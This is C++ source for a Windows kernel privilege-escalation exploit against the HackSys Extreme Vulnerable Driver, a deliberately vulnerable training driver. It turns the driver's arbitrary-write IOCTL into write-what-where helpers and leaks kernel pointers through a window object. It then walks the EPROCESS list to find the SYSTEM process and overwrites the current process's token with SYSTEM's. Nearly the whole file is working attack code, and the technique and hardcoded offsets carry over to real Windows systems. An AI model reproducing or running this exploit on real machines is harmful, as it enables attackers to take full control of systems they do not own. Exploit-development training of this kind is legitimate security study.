#include "exploit.h"

HANDLE hDevice = NULL;

/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}

/*
* write_what_where_dword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_dword(UINT64 whereWriteAddress, UINT32 writeWhatValue)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	// 触发漏洞函数获取write_what_where的机会
	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
}

/*
* write_what_where_qword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_qword(UINT64 whereWriteAddress, UINT64 writeWhatValue)
{
	UINT32 lowValue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowValue);

	UINT32 highValue = writeWhatValue >> 0x20;
	write_what_where_dword(whereWriteAddress + 0x4, highValue);
}


/*
* stealToken:
*	[+] 获取system进程得Token值
*	[+] 返回值:
*			system token的值
*	[+] From: https://github.com/k0keoyo/HEVD-Arbitrary-Overwrite-Exploit-Win10-rs3/blob/master/HEVD_Arbitrary_Write_exp_1709/HEVD_Arbitrary_Write_exp_1709.cpp#L358
*/
/*
* stealToken:
*	[+] 获取system进程得Token值
*	[+] 返回值:
*			system token的值
*	[+] From: https://github.com/k0keoyo/HEVD-Arbitrary-Overwrite-Exploit-Win10-rs3/blob/master/HEVD_Arbitrary_Write_exp_1709/HEVD_Arbitrary_Write_exp_1709.cpp#L358
*/
DWORD64 stealToken()
{
	WNDCLASSEX leak_Class = { 0 };
	//wsprintf(st, L"CCCCCCCCCCCCCCCCCCCCCCC");
	leak_Class.lpfnWndProc = DefWindowProc;
	leak_Class.lpszClassName = TEXT("leakWND");
	leak_Class.lpszMenuName = TEXT("leakWND");
	leak_Class.cbSize = sizeof(WNDCLASSEX);
	int result = RegisterClassEx(&leak_Class);
	if (!result)
	{
		std::cout << "[+] RegisterClass Failed" << std::endl;
		exit(-1);
	}
	HWND leak_HWND = CreateWindowEx(
		0,
		leak_Class.lpszClassName,//wnd.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);
	//Int_3();
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(leak_HWND, 1);
	DWORD64 _KTHREAD_kobj;

	readOOB((DWORD64)tagWND->h.pti, (BYTE *)&_KTHREAD_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] _KTHREAD address is: " << (DWORD64)_KTHREAD_kobj << std::endl;
	DWORD64 _KAPC_uobj = (DWORD64)_KTHREAD_kobj + 0x98;
	DWORD64 _KAPC_kobj = 0;
	readOOB((UINT64)_KAPC_uobj, (BYTE *)&_KAPC_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] _KAPC_STAT address is: " << (DWORD64)_KAPC_kobj << std::endl;
	DWORD64 _EPROCESS_uobj = _KAPC_kobj + 0x20;
	DWORD64 _EPROCESS_kobj = 0;
	readOOB((UINT64)_EPROCESS_uobj, (BYTE *)&_EPROCESS_kobj, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] Current _EPROCESS address is: " << (DWORD64)_EPROCESS_kobj << std::endl;
	DWORD64 _Current_Token = 0;
	DWORD64 _Current_Token_Address = _EPROCESS_kobj + 0x358;
	readOOB((UINT64)_Current_Token_Address, (BYTE *)&_Current_Token, sizeof(DWORD64));
	//Int_3();
	std::cout << "[+] Current Process Token is: " << _Current_Token << std::endl;
	std::cout << "[+] Current Process Token at: " << _Current_Token_Address << std::endl;

	//Let's find system process and system token
	DWORD dwUniqueProcessIdOffset = 0x2e0;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2e8;
	DWORD64 lpPreEPROCESS = NULL;
	DWORD64 lpCurrentProcID = NULL;
	LIST_ENTRY lePreProcessLink;
	DWORD64 lpSystemToken = NULL;
	DWORD dwCurrentPID;
	readOOB(_EPROCESS_kobj + dwUniqueProcessIdOffset, (BYTE *)&lpCurrentProcID, sizeof(DWORD64));
	readOOB(_EPROCESS_kobj + dwActiveProcessLinks, (BYTE *)&lePreProcessLink, sizeof(LIST_ENTRY));
	do {
		lpPreEPROCESS = (DWORD64)lePreProcessLink.Blink - dwActiveProcessLinks;
		readOOB(lpPreEPROCESS + dwUniqueProcessIdOffset, (BYTE *)&lpCurrentProcID, sizeof(DWORD64));
		readOOB(lpPreEPROCESS + dwTokenOffset, (BYTE *)&lpSystemToken, sizeof(DWORD64));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		readOOB(lpPreEPROCESS + dwActiveProcessLinks, (BYTE *)&lePreProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentProcID);

	} while (dwCurrentPID != 0x4);
	//Int_3();
	write_what_where_qword(_Current_Token_Address, (DWORD64)lpSystemToken);
	//writeOOB(_Current_Token_Address, (BYTE *)&lpSystemToken, sizeof(DWORD64));
}
/*
* runShellCode:
*	[+] 运行shellcode, 替换TOKEN
*/
VOID runShellCode()
{
	stealToken();
}

